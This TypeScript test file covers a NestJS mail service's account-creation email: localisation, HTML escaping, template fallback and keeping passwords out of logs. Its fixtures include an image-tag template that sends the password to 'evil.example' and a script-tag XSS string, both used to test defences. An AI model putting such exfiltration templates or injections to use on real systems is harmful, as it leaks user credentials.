import type { ConfigService } from '@nestjs/config';
import { EmailLogStatus } from '@prisma/client';
import { MailService, redactSecrets } from './mail.service';
import { accountCreatedEmail } from './templates';
import type { PrismaService } from '../../prisma/prisma.service';
import type { CryptoService } from '../../common/crypto/crypto.service';
import { NotificationTemplatesService } from '../notification-templates/notification-templates.service';

// The `account_created` email: login details of an auto-created account plus
// a one-time magic link. Covers the bundled builder (locales, RTL, escaping,
// each secret exactly once), the store-override / platform / bundled render
// chain, and that the password never reaches the delivery or app log.

const PASSWORD = 'Kx7mP2qRw9Tn4bVz';
const MAGIC = 'https://shop.example.com/auth/magic#token=raw-token-123';
const LOGIN = 'https://shop.example.com/auth/login';

const data = {
  name: 'Anna',
  email: 'anna@example.com',
  password: PASSWORD,
  magicUrl: MAGIC,
  loginUrl: LOGIN,
  expiresHours: 72,
};

const count = (haystack: string, needle: string) =>
  haystack.split(needle).length - 1;

describe('accountCreatedEmail (bundled builder)', () => {
  it('puts the magic link and the password in the HTML exactly once', () => {
    const out = accountCreatedEmail(data, { storeName: 'Namez' }, 'en');
    expect(count(out.html, MAGIC)).toBe(1);
    expect(count(out.html, PASSWORD)).toBe(1);
    expect(out.html).toContain(`href="${LOGIN}"`);
    expect(out.html).toContain('Log in with one click');
    expect(out.html).toContain('valid for 72 hours and can be used once');
    expect(out.html).toContain('Account → Change password');
    expect(out.html).toContain('If you did not place an order');
    expect(out.html).toMatch(/monospace[^>]*user-select:all/);
    expect(out.subject).toBe('Your account at Namez');
    // Plain-text part carries everything too.
    expect(out.text).toContain(PASSWORD);
    expect(out.text).toContain(MAGIC);
    expect(out.text).toContain(LOGIN);
    expect(out.text).toContain('Hi Anna,');
  });

  it('subject never contains the password', () => {
    for (const locale of ['en', 'ar', 'tr', 'de', 'fr', 'sv']) {
      expect(
        accountCreatedEmail(data, undefined, locale).subject,
      ).not.toContain(PASSWORD);
    }
  });

  it('renders Arabic right-to-left with the credentials kept LTR', () => {
    const out = accountCreatedEmail(data, { storeName: 'نمز' }, 'ar');
    expect(out.html).toContain('<html dir="rtl">');
    expect(out.html).toContain('تسجيل الدخول بنقرة واحدة');
    expect(out.html).toContain('<span dir="ltr"');
    expect(out.subject).toBe('حسابك في نمز');
  });

  it('renders German, and an unknown locale falls back to English', () => {
    expect(accountCreatedEmail(data, undefined, 'de-AT').subject).toBe(
      'Ihr Konto bei Multi Stores',
    );
    const unknown = accountCreatedEmail(data, { platformName: 'P' }, 'xx');
    expect(unknown.subject).toBe('Your account at P');
    expect(unknown.html).not.toContain('dir="rtl"');
  });

  it('escapes every value in the HTML', () => {
    const out = accountCreatedEmail(
      {
        ...data,
        name: '<script>alert(1)</script>',
        password: 'a<b"c',
        magicUrl: 'https://x.example/m?a=1&b="2"',
      },
      { storeName: 'Shop <b>' },
      'en',
    );
    expect(out.html).not.toContain('<script>');
    expect(out.html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(out.html).toContain('a&lt;b&quot;c');
    expect(out.html).toContain(
      'href="https://x.example/m?a=1&amp;b=&quot;2&quot;"',
    );
    expect(out.html).toContain('Shop &lt;b&gt;');
    expect(out.html).not.toContain('Shop <b>');
  });

  it('greets without a name when none is given', () => {
    const out = accountCreatedEmail({ ...data, name: '' }, undefined, 'sv');
    expect(out.html).toContain('Hej,');
    expect(out.text.startsWith('Hej,')).toBe(true);
  });
});

/** MailService with prisma + templates mocked; send() spied. */
function build(opts: {
  storeType?: 'INDEPENDENT' | 'MARKETPLACE';
  override?: { subject: string; body_html: string; body_text: string } | null;
  platform?: { subject: string; body_html: string; body_text: string } | null;
  primaryLocale?: string;
}) {
  const row = (t: {
    subject: string;
    body_html: string;
    body_text: string;
  }) => ({
    enabled: true,
    subject: { en: t.subject },
    body_html: { en: t.body_html },
    body_text: { en: t.body_text },
  });
  const prisma = {
    platformConfig: {
      findFirst: jest.fn().mockResolvedValue({ platform_name: 'Platform' }),
    },
    store: {
      findUnique: jest.fn().mockResolvedValue({
        store_type: opts.storeType ?? 'INDEPENDENT',
        logo_url: null,
        language_config: opts.primaryLocale
          ? { primary_locale: opts.primaryLocale }
          : null,
      }),
    },
    storeNotificationTemplate: {
      findUnique: jest
        .fn()
        .mockResolvedValue(opts.override ? row(opts.override) : null),
    },
    notificationTemplate: {
      findUnique: jest
        .fn()
        .mockResolvedValue(opts.platform ? row(opts.platform) : null),
    },
  };
  const templates = new NotificationTemplatesService(
    prisma as unknown as PrismaService,
  );
  const service = new MailService(
    { get: () => undefined } as unknown as ConfigService,
    prisma as unknown as PrismaService,
    {} as CryptoService,
    templates,
  );
  const send = jest.spyOn(service, 'send').mockResolvedValue({ sent: true });
  return { service, send, prisma };
}

type SendArgs = Parameters<MailService['send']>[0];
const sentWith = (send: jest.SpyInstance): SendArgs =>
  (send.mock.calls as SendArgs[][])[0][0];

describe('MailService.sendAccountCreated', () => {
  const brand = { storeId: 's1', storeName: 'Namez' };

  it('ignores an independent store override, escapes vars in the platform template and forces the platform sender', async () => {
    const { service, send } = build({
      // A store-controlled template could exfiltrate the secrets (e.g. an
      // <img> pointing at the owner's server): it must never be used.
      override: {
        subject: 'OWN {{password}}',
        body_html: '<img src="https://evil.example/?p={{password}}">',
        body_text: 'own',
      },
      platform: {
        subject: 'Welcome {{name}} to {{store_name}}',
        body_html:
          '<p>{{name}} {{password}} <a href="{{magic_url}}">go</a></p>',
        body_text: '{{name}} {{password}} {{magic_url}}',
      },
    });
    await service.sendAccountCreated(
      'anna@example.com',
      { ...data, name: '<script>x</script>' },
      'en',
      brand,
    );
    const args = sentWith(send);
    expect(args.subject).toBe('Welcome <script>x</script> to Namez');
    expect(args.html).toBe(
      `<p>&lt;script&gt;x&lt;/script&gt; ${PASSWORD} <a href="${MAGIC}">go</a></p>`,
    );
    expect(args.text).toBe(`<script>x</script> ${PASSWORD} ${MAGIC}`);
    expect(args.storeId).toBe('s1');
    expect(args.platformSenderOnly).toBe(true);
    expect(args.event).toBe('account_created');
    expect(args.brandFooter).toEqual({
      storeName: 'Namez',
      customerEmail: 'anna@example.com',
      locale: 'en',
    });
    expect(args.sensitive).toEqual([PASSWORD, MAGIC]);
  });

  it('ignores the override for a marketplace store and uses the platform template', async () => {
    const { service, send } = build({
      storeType: 'MARKETPLACE',
      override: { subject: 'OWN', body_html: '<p>own</p>', body_text: 'own' },
      platform: {
        subject: 'Platform {{store_name}}',
        body_html: '<p>{{password}}</p>',
        body_text: '{{password}}',
      },
    });
    await service.sendAccountCreated('a@x.se', data, 'en', brand);
    expect(sentWith(send).subject).toBe('Platform Namez');
  });

  it('falls back to the bundled builder without any template', async () => {
    const { service, send } = build({});
    await service.sendAccountCreated('a@x.se', data, 'ar', brand);
    const args = sentWith(send);
    expect(args.subject).toBe('حسابك في Namez');
    expect(args.html).toContain('dir="rtl"');
    expect(count(args.html, PASSWORD)).toBe(1);
    expect(count(args.html, MAGIC)).toBe(1);
  });

  it('locale: an unsupported one falls back to the store primary, then English', async () => {
    const withStore = build({ primaryLocale: 'de' });
    await withStore.service.sendAccountCreated('a@x.se', data, 'xx', brand);
    expect(sentWith(withStore.send).subject).toBe('Ihr Konto bei Namez');

    const platformOnly = build({});
    await platformOnly.service.sendAccountCreated('a@x.se', data, null, null);
    const args = sentWith(platformOnly.send);
    expect(args.subject).toBe('Your account at Platform');
    // No store: platform email, no store sender, no attribution footer.
    expect(args.storeId).toBeUndefined();
    expect(args.brandFooter).toBeUndefined();
  });

  it('never throws', async () => {
    const { service, prisma, send } = build({});
    prisma.platformConfig.findFirst.mockRejectedValue(new Error('db down'));
    await expect(
      service.sendAccountCreated('a@x.se', data, 'en', brand),
    ).resolves.toBeUndefined();
    expect(send).not.toHaveBeenCalled();
  });
});

describe('account_created and the logs', () => {
  function realSend(opts: { smtp: boolean; smtpFails?: boolean }) {
    const create = jest.fn().mockResolvedValue({});
    const prisma = {
      emailLog: { create, deleteMany: jest.fn().mockResolvedValue({}) },
    };
    const service = new MailService(
      { get: () => undefined } as unknown as ConfigService,
      prisma as unknown as PrismaService,
      {} as CryptoService,
      {} as NotificationTemplatesService,
    );
    const internals = service as unknown as Record<
      string,
      (...args: unknown[]) => Promise<unknown>
    >;
    jest
      .spyOn(internals, 'resolveConfig')
      .mockResolvedValue(
        opts.smtp
          ? { host: 'smtp.platform', port: 587, secure: false, from: 'n@p.se' }
          : null,
      );
    jest
      .spyOn(
        service as unknown as Record<string, () => unknown>,
        'transporterFor',
      )
      .mockReturnValue({
        sendMail: jest.fn(() =>
          opts.smtpFails
            ? Promise.reject(new Error(`rejected message ${PASSWORD}`))
            : Promise.resolve({}),
        ),
      });
    const logger = (service as unknown as { logger: Record<string, jest.Mock> })
      .logger;
    const warn = jest.spyOn(logger, 'warn').mockImplementation(() => undefined);
    const error = jest
      .spyOn(logger, 'error')
      .mockImplementation(() => undefined);
    return { service, create, warn, error };
  }

  // Worst case: an admin template that puts the password in the subject.
  const message = () => ({
    to: 'anna@example.com',
    ...accountCreatedEmail(data, undefined, 'en'),
    subject: `Your password is ${PASSWORD}`,
    event: 'account_created',
    sensitive: [PASSWORD, MAGIC],
  });

  it.each([
    ['sent', { smtp: true }, EmailLogStatus.SENT],
    ['failed', { smtp: true, smtpFails: true }, EmailLogStatus.FAILED],
    ['skipped', { smtp: false }, EmailLogStatus.SKIPPED],
  ] as const)(
    'logDelivery never writes the password (%s)',
    async (_label, opts, status) => {
      const { service, create, warn, error } = realSend(opts);
      await service.send(message());
      expect(create).toHaveBeenCalledTimes(1);
      const written = (create.mock.calls as { data: object }[][])[0][0];
      expect(written.data).toMatchObject({
        event: 'account_created',
        recipient: 'anna@example.com',
        status,
      });
      const json = JSON.stringify(written);
      expect(json).not.toContain(PASSWORD);
      expect(json).not.toContain(MAGIC);
      // Metadata only: no body columns.
      expect(written.data).not.toHaveProperty('html');
      expect(written.data).not.toHaveProperty('text');
      for (const call of [...warn.mock.calls, ...error.mock.calls]) {
        expect(JSON.stringify(call)).not.toContain(PASSWORD);
      }
    },
  );

  it('platformSenderOnly skips the store senders but keeps the store on the log', async () => {
    const { service, create } = realSend({ smtp: true });
    const internals = service as unknown as Record<string, unknown>;
    const provider = { tryProvider: jest.fn() };
    const resolveStoreConfig = jest
      .spyOn(
        internals as Record<string, () => Promise<unknown>>,
        'resolveStoreConfig',
      )
      .mockResolvedValue({
        host: 'smtp.store',
        port: 587,
        secure: false,
        from: 's@s.se',
      });
    const tryProvider = jest
      .spyOn(internals as Record<string, () => Promise<boolean>>, 'tryProvider')
      .mockResolvedValue(true);
    (internals.storeProviders as unknown[]).push(provider);

    await service.send({
      ...message(),
      storeId: 's1',
      platformSenderOnly: true,
    });

    expect(tryProvider).not.toHaveBeenCalled();
    expect(resolveStoreConfig).not.toHaveBeenCalled();
    const written = (
      create.mock.calls as { data: Record<string, unknown> }[][]
    )[0][0];
    expect(written.data).toMatchObject({
      store_id: 's1',
      smtp_host: 'smtp.platform',
    });
  });

  it('redactSecrets masks every occurrence and ignores empty secrets', () => {
    expect(redactSecrets('a pw b pw', ['pw', ''])).toBe(
      'a [redacted] b [redacted]',
    );
    expect(redactSecrets('plain', undefined)).toBe('plain');
  });
});
